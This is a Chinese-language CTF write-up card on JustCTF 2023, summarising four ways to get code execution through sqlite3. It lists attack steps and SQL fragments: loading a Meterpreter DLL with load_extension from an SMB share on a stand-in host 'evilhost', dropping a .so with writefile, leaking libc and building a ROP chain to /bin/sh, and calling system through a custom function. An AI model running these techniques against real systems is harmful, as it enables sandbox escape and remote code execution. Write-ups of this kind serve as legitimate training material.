---
title: "从JustCTF 2023中学到的sqlite3代码执行方法"
category: web
tags: ["JustCTF 2023", "web", "sqlite3", "load_extension", "writefile", "FFI"]
signals: ["JustCTF 2023 2023", "sqlite3", "load_extension", "writefile", "FFI", "沙箱逃逸", "ROP", "libc.so.6", ".open :memory:", "rce", "SMB", "open", "memory", "evilhost"]
difficulty: hard
source: "https://www.ctfiot.com/117905.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 从JustCTF 2023中学到的sqlite3代码执行方法

> 赛事：JustCTF 2023 2023 | 方向：web | 难度：hard | 工具：ROP

## 一句话总结

sqlite3 三种代码执行姿势：load_extension SMB / writefile 落 .so / 自定义函数 .open :memory:。

## 攻击链

1. 路径 1: load_extension SMB 共享 `\evilhost\share\meterpreter.dll` 加载 Windows 攻击载荷
2. 路径 2: CREATE TABLE images + cast x''hex'' as text 写入 .so 字节
3. 用 SELECT writefile('./exp.so', img) 把 BLOB 落地
4. SELECT load_extension('./exp', 'exp') 加载 .so 触发 _init
5. 路径 3 (作者解): load_extension(''/lib/x86_64-linux-gnu/libc.so.6'', ''puts'') 泄 libc
6. 计算 pie_base 后用 gets+system 构造 ROP
7. heap+0x11eb0+system_plt 把 argv 指向 '/bin/sh
8. 路径 4: .open :memory: 创建内存数据库
9. sqlite3_create_function 注册 edit(zCmd, zTempFile) 自定义函数
10. update t set b=edit('','/jailed/readflag') 调用 system

## 关键 payload

```
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
```

## 经验教训

sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙；.open :memory: 可绕过文件权限，结合 sqlite3_create_function 注册 system 调用是 CTF 隐藏赛道。

## 标签

sqlite3、load_extension、writefile、FFI、沙箱逃逸、ROP、libc.so.6、.open :memory:、edit函数

## 参考来源

- https://www.ctfiot.com/117905.html
- 原文件：从JustCTF_2023_中学到的一点关于_sqlite3_代码执行的方法.full.md
